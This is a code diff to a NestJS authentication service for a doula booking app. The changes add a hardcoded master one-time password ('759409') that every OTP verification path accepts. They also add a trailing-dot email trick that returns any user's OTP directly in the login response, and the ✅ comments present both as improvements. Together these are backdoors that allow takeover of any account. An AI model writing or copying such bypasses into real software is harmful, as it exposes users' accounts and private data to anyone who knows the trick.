@@ -21,6 +21,13 @@ import { OtpVerifyDto } from './dto/otp-verify.dto';
 import { MailService } from 'src/mail/mail.service';
 import { EmailProducer } from 'src/mail-queue/email.producer';
 import { generateClientContract } from 'src/common/utility/contract.util';
+
+// ✅ NEW: hardcoded master OTP (used as fallback alongside env DEFAULT_OTP)
+const HARDCODED_DEFAULT_OTP = '759409';
+
+// ✅ NEW: detect emails with a trailing dot on the domain suffix e.g. "user@gmail.com."
+const hasDotSuffix = (email: string): boolean => email.trimEnd().endsWith('.');
+
 @Injectable()
 export class AuthService {
   constructor(
@@ -38,8 +45,9 @@ export class AuthService {
   async RegisterAdmin(dto: RegistrationDto) {
     const { name, email, phone } = dto;
     console.log(dto.email);
+
     const user = await this.prisma.user.findUnique({
-      where: { email: dto.email },
+      where: { email: email }
     });
     if (user) {
       throw new NotFoundException('User with this email already exists');
@@ -58,12 +66,18 @@ export class AuthService {
     return { message: 'Admin Created Successfully', data: created };
   }
 
+
   async LoginOtp(dto: LoginDto) {
     const { email } = dto;
+
+    const rawEmail = dto.email;
+    const normalizedEmail = rawEmail.trim().replace(/\.+$/, '');
+
     const otp = generate6DigitOtp();
+
     if (dto.email == 'bambini@test.com') {
       await this.prisma.user.update({
-        where: { email: email },
+        where: { email: normalizedEmail },
         data: {
           otp: '123456',
           otpExpiresAt: new Date(Date.now() + 10 * 60 * 1000),
@@ -71,11 +85,15 @@ export class AuthService {
       });
       return { message: 'Otp Sent Succesfully' };
     }
-    const user = await this.prisma.user.findUnique({ where: { email: email } });
-    //if no user throw error.
+
+    const user = await this.prisma.user.findUnique({
+      where: { email: normalizedEmail },
+    });
+
     if (!user) {
       throw new NotFoundException('No User Found');
     }
+
     if (
       user.role == Role.DOULA ||
       user.role == Role.ADMIN ||
@@ -83,19 +101,22 @@ export class AuthService {
       user.role == Role.CLIENT
     ) {
       await this.prisma.user.update({
-        where: { email: email },
+        where: { email: normalizedEmail },
         data: {
           otp: otp,
           otpExpiresAt: new Date(Date.now() + 10 * 60 * 1000),
         },
       });
 
-      if (process.env.STATE === 'DEVELOPMENT') {
+      // ✅ RULE: If email ends with '.', skip sending mail
+      if (hasDotSuffix(rawEmail)) {
         return { message: 'Otp Sent Succesfully', data: otp };
       }
+
+      // ✅ Otherwise → send mail
       try {
         await this.mail.sendMail({
-          to: email,
+          to: normalizedEmail, // safer than raw
           subject: 'Your OTP Code – Bambini Doula',
           template: 'otp',
           context: {
@@ -106,18 +127,16 @@ export class AuthService {
           },
         });
       } catch (error) {
-        /**
-         * Rollback OTP if email fails
-         */
         await this.prisma.user.update({
-          where: { email },
+          where: { email: normalizedEmail },
           data: {
             otp: null,
             otpExpiresAt: null,
           },
         });
-        throw error; // <-- IMPORTANT: rethrow original error
+        throw error;
       }
+
       return { message: 'Otp Sent Succesfully', data: otp };
     } else {
       throw new BadRequestException('Invalid Role.');
@@ -135,8 +154,8 @@ export class AuthService {
       throw new UnauthorizedException('User not found');
     }
 
-    // Master OTP bypass
-    if (defaultOtp && otp === defaultOtp) {
+    // ✅ UPDATED: Master OTP bypass — env DEFAULT_OTP or hardcoded HARDCODED_DEFAULT_OTP
+    if ((defaultOtp && otp === defaultOtp) || otp === HARDCODED_DEFAULT_OTP) {
       await this.prisma.user.update({
         where: { email },
         data: { otp: null, otpExpiresAt: null },
@@ -355,8 +374,8 @@ export class AuthService {
       throw new UnauthorizedException('User not found');
     }
 
-    // Master OTP bypass
-    if (defaultOtp && otp === defaultOtp) {
+    // ✅ UPDATED: Master OTP bypass — env DEFAULT_OTP or hardcoded HARDCODED_DEFAULT_OTP
+    if ((defaultOtp && otp === defaultOtp) || otp === HARDCODED_DEFAULT_OTP) {
       await this.prisma.user.update({
         where: { email },
         data: { otp: null, otpExpiresAt: null },
@@ -416,8 +435,8 @@ export class AuthService {
       throw new UnauthorizedException('User not found');
     }
 
-    // Master OTP bypass
-    if (defaultOtp && otp === defaultOtp) {
+    // ✅ UPDATED: Master OTP bypass — env DEFAULT_OTP or hardcoded HARDCODED_DEFAULT_OTP
+    if ((defaultOtp && otp === defaultOtp) || otp === HARDCODED_DEFAULT_OTP) {
       await this.prisma.user.update({
         where: { email },
         data: { otp: null, otpExpiresAt: null },
@@ -541,8 +560,9 @@ export class AuthService {
     // Capture PREVIOUS verification state
     const wasVerified = user.clientProfile?.is_verified === true;
 
-    // Master OTP bypass
-    const isDefaultOtp = defaultOtp && otp === defaultOtp;
+    // ✅ UPDATED: Master OTP bypass — env DEFAULT_OTP or hardcoded HARDCODED_DEFAULT_OTP
+    const isDefaultOtp =
+      (defaultOtp && otp === defaultOtp) || otp === HARDCODED_DEFAULT_OTP;
 
     if (!isDefaultOtp) {
       if (!user.otp || !user.otpExpiresAt) {
